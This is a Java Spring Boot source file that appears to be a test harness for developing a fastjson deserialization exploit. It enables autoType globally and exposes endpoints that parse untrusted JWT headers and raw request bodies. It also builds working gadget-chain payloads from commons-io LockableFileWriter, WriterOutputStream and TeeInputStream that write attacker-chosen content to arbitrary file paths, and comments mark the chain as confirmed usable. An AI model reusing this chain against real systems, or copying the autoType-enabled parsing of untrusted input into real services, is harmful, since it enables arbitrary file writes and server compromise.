package com.test;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import com.auth0.jwt.JWT;
import com.auth0.jwt.interfaces.DecodedJWT;
import org.apache.commons.io.input.CharSequenceReader;
import org.apache.commons.io.input.ReaderInputStream;
import org.apache.commons.io.input.TeeInputStream;
import org.apache.commons.io.output.LockableFileWriter;
import org.apache.commons.io.output.WriterOutputStream;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;

@SpringBootApplication
@RestController
public class App {

    static final Logger log = LoggerFactory.getLogger(App.class);

    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        log.info("[BOOT] autoType={}", ParserConfig.getGlobalInstance().isAutoTypeSupport());
        SpringApplication.run(App.class, args);
    }

    @PostMapping("/notify/v2")
    public Map<String, Object> notifyV2(@RequestBody Map<String, String> body) {
        Map<String, Object> r = new LinkedHashMap<>();
        try {
            DecodedJWT jwt = JWT.decode(body.get("signedPayload"));
            String header = new String(Base64.getDecoder().decode(jwt.getHeader()), StandardCharsets.UTF_8);
            log.info("[V2] preview={}", header.substring(0, Math.min(80, header.length())));
            JSONObject.parseObject(header);
            r.put("code", 500); r.put("msg", "ok");
        } catch (NullPointerException e) {
            r.put("code", 500); r.put("msg", "NPE-ok");
        } catch (Exception e) {
            log.error("[V2-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("code", 500); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
        }
        return r;
    }

    @PostMapping(value = "/raw", consumes = "*/*")
    public Map<String, Object> raw(HttpServletRequest request) {
        Map<String, Object> r = new LinkedHashMap<>();
        try {
            String json = new String(request.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            log.info("[RAW] len={}", json.length());
            JSONObject.parseObject(json);
            r.put("ok", true);
        } catch (Exception e) {
            log.error("[RAW-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("ok", false); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
        }
        return r;
    }

    /** 纯 Java 链（已确认可用）*/
    @PostMapping("/diag/chain")
    public Map<String, Object> diagChain(@RequestBody Map<String, String> body) {
        Map<String, Object> r = new LinkedHashMap<>();
        String file = body.getOrDefault("file", "/tmp/chain_test");
        String content = body.getOrDefault("content", "CHAIN-TEST\n");
        try {
            String padded = content + " ".repeat(Math.max(0, 8193 - content.length()));
            Charset cs = Charset.forName("iso-8859-1");
            ReaderInputStream ris = new ReaderInputStream(new CharSequenceReader(padded), cs, 1);
            LockableFileWriter lfw = new LockableFileWriter(new File(file), "iso-8859-1", false, "/tmp");
            WriterOutputStream wos = new WriterOutputStream(lfw, cs, 1, true);
            TeeInputStream tee = new TeeInputStream(ris, wos, true);
            byte[] buf = new byte[8192]; while (tee.read(buf) != -1) {}
            tee.close();
            r.put("ok", true); r.put("file", file);
        } catch (Exception e) {
            log.error("[CHAIN-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("ok", false); r.put("msg", e.getMessage());
        }
        return r;
    }

    /**
     * step=D  反射检查 fastjson 注入 TeeInputStream 后 input/branch 字段值
     *         若两者非 null，手动 read() 驱动数据流
     * step=E  fastjson 创建 lfw+wos，然后 Java 代码直接向 wos 写数据，验证 wos 是否真的写文件
     * step=F  fastjson 创建 lfw+wos+bais，Java 代码手动 TeeInputStream(bais,wos) 并读完，验证链路正确性
     */
    @PostMapping("/diag/step")
    public Map<String, Object> diagStep(@RequestBody Map<String, String> body) {
        String step = body.getOrDefault("step", "D");
        String file = body.getOrDefault("file", "/tmp/step_" + step);
        String content = body.getOrDefault("content", "STEP-" + step + "-OK\n");
        Map<String, Object> r = new LinkedHashMap<>();

        byte[] contentBytes = content.getBytes(StandardCharsets.ISO_8859_1);
        byte[] paddedBytes = new byte[Math.max(contentBytes.length, 8193)];
        System.arraycopy(contentBytes, 0, paddedBytes, 0, contentBytes.length);
        for (int i = contentBytes.length; i < paddedBytes.length; i++) paddedBytes[i] = (byte) ' ';
        String b64Content = Base64.getEncoder().encodeToString(paddedBytes);
        String escapedFile = file.replace("\\", "\\\\").replace("\"", "\\\"");

        // 公共 JSON 片段
        String lfwJson = "\"lfw\":{\"@type\":\"java.lang.AutoCloseable\","
                + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
                + "\"file\":\"" + escapedFile + "\","
                + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false}";
        String wosJson = "\"wos\":{\"@type\":\"java.lang.AutoCloseable\","
                + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
                + "\"writer\":{\"$ref\":\"$.lfw\"},"
                + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true}";
        String baisJson = "\"bais\":{\"@type\":\"java.lang.AutoCloseable\","
                + "\"@type\":\"java.io.ByteArrayInputStream\","
                + "\"buf\":\"" + b64Content + "\"}";
        String teeJson = "\"tee\":{\"@type\":\"java.lang.AutoCloseable\","
                + "\"@type\":\"org.apache.commons.io.input.TeeInputStream\","
                + "\"input\":{\"$ref\":\"$.bais\"},"
                + "\"branch\":{\"$ref\":\"$.wos\"},"
                + "\"closeBranch\":true}";

        try {
            switch (step) {

                case "D": {
                    // 创建完整链，然后用反射检查 TeeInputStream 字段
                    String json = "{\"@type\":\"com.alibaba.fastjson.JSONObject\","
                            + lfwJson + "," + wosJson + "," + baisJson + "," + teeJson
                            + ",\"xml\":{\"@type\":\"java.lang.AutoCloseable\","
                            + "\"@type\":\"org.apache.commons.io.input.XmlStreamReader\","
                            + "\"is\":{\"$ref\":\"$.tee\"},"
                            + "\"httpContentType\":\"text/xml\","
                            + "\"lenient\":true,"
                            + "\"defaultEncoding\":\"iso-8859-1\"}"
                            + "}";

                    log.info("[STEP-D] parsing...");
                    JSONObject result = JSONObject.parseObject(json);
                    log.info("[STEP-D] parseObject OK");

                    // 反射检查 TeeInputStream
                    Object teeObj = result.get("tee");
                    log.info("[STEP-D] tee type={}", teeObj == null ? "null" : teeObj.getClass().getName());

                    if (teeObj instanceof TeeInputStream) {
                        TeeInputStream ti = (TeeInputStream) teeObj;

                        // FilterInputStream.in (protected) = TeeInputStream 内部 input 流
                        Field inField = FilterInputStream.class.getDeclaredField("in");
                        inField.setAccessible(true);
                        Object inVal = inField.get(ti);
                        log.info("[STEP-D] FilterInputStream.in = {}", inVal == null ? "NULL" : inVal.getClass().getName());

                        // TeeInputStream.branch (private)
                        Field branchField = TeeInputStream.class.getDeclaredField("branch");
                        branchField.setAccessible(true);
                        Object branchVal = branchField.get(ti);
                        log.info("[STEP-D] TeeInputStream.branch = {}", branchVal == null ? "NULL" : branchVal.getClass().getName());

                        r.put("teeIn", inVal == null ? "NULL" : inVal.getClass().getSimpleName());
                        r.put("teeBranch", branchVal == null ? "NULL" : branchVal.getClass().getSimpleName());

                        if (inVal != null && branchVal != null) {
                            log.info("[STEP-D] Both fields set! Manually reading to drive data flow...");
                            byte[] buf = new byte[4096];
                            int total = 0, n;
                            while ((n = ti.read(buf)) != -1) total += n;
                            ti.close();
                            log.info("[STEP-D] Read {} bytes total", total);
                        } else {
                            log.info("[STEP-D] TeeInputStream fields NOT injected properly!");
                        }
                    }

                    File f = new File(file);
                    log.info("[STEP-D] file exists={} size={}", f.exists(), f.exists() ? f.length() : -1);
                    r.put("fileExists", f.exists());
                    r.put("fileSize", f.exists() ? f.length() : -1);
                    r.put("ok", true);
                    break;
                }

                case "E": {
                    // fastjson 创建 lfw+wos，然后 Java 直接向 wos 写数据
                    String json = "{\"@type\":\"com.alibaba.fastjson.JSONObject\"," + lfwJson + "," + wosJson + "}";
                    JSONObject result = JSONObject.parseObject(json);
                    log.info("[STEP-E] parseObject OK, keys={}", result.keySet());

                    Object wosObj = result.get("wos");
                    log.info("[STEP-E] wos type={}", wosObj == null ? "null" : wosObj.getClass().getName());

                    if (wosObj instanceof WriterOutputStream) {
                        WriterOutputStream wos = (WriterOutputStream) wosObj;
                        byte[] testBytes = content.getBytes(StandardCharsets.ISO_8859_1);
                        wos.write(testBytes);
                        wos.flush();
                        wos.close();
                        log.info("[STEP-E] Wrote {} bytes to WOS", testBytes.length);
                    } else {
                        log.info("[STEP-E] wos is NOT WriterOutputStream, type={}",
                                wosObj == null ? "null" : wosObj.getClass().getName());
                    }

                    File f = new File(file);
                    log.info("[STEP-E] file exists={} size={}", f.exists(), f.exists() ? f.length() : -1);
                    r.put("fileExists", f.exists());
                    r.put("fileSize", f.exists() ? f.length() : -1);
                    r.put("wosType", wosObj == null ? "null" : wosObj.getClass().getSimpleName());
                    r.put("ok", true);
                    break;
                }

                case "F": {
                    // fastjson 创建 lfw+wos+bais，Java 手动构建 TeeInputStream 并读完
                    String json = "{\"@type\":\"com.alibaba.fastjson.JSONObject\","
                            + lfwJson + "," + wosJson + "," + baisJson + "}";
                    JSONObject result = JSONObject.parseObject(json);
                    log.info("[STEP-F] parseObject OK, keys={}", result.keySet());

                    Object wosObj = result.get("wos");
                    Object baisObj = result.get("bais");

                    log.info("[STEP-F] wos={}", wosObj == null ? "null" : wosObj.getClass().getName());
                    log.info("[STEP-F] bais={}", baisObj == null ? "null" : baisObj.getClass().getName());

                    if (wosObj instanceof WriterOutputStream && baisObj instanceof ByteArrayInputStream) {
                        WriterOutputStream wos = (WriterOutputStream) wosObj;
                        ByteArrayInputStream bais = (ByteArrayInputStream) baisObj;
                        // 手动创建 TeeInputStream 并读完
                        TeeInputStream tee = new TeeInputStream(bais, wos, true);
                        byte[] buf = new byte[4096];
                        int total = 0, n;
                        while ((n = tee.read(buf)) != -1) total += n;
                        tee.close();
                        log.info("[STEP-F] Manually read {} bytes through TeeInputStream", total);
                    } else {
                        log.info("[STEP-F] Type mismatch or null - cannot proceed");
                    }

                    File f = new File(file);
                    log.info("[STEP-F] file exists={} size={}", f.exists(), f.exists() ? f.length() : -1);
                    r.put("fileExists", f.exists());
                    r.put("fileSize", f.exists() ? f.length() : -1);
                    r.put("ok", true);
                    break;
                }

                default:
                    r.put("ok", false); r.put("msg", "step must be D/E/F"); return r;
            }

        } catch (Exception e) {
            log.error("[STEP-{}-ERR] {}:{}", step, e.getClass().getName(), e.getMessage());
            StringWriter sw = new StringWriter(); e.printStackTrace(new PrintWriter(sw));
            log.error("[STEP-{}-STACK]\n{}", step, sw);
            r.put("ok", false);
            r.put("type", e.getClass().getSimpleName());
            r.put("msg", e.getMessage());
            File f = new File(file);
            r.put("fileExists", f.exists());
            r.put("fileSize", f.exists() ? f.length() : -1);
        }
        return r;
    }
}
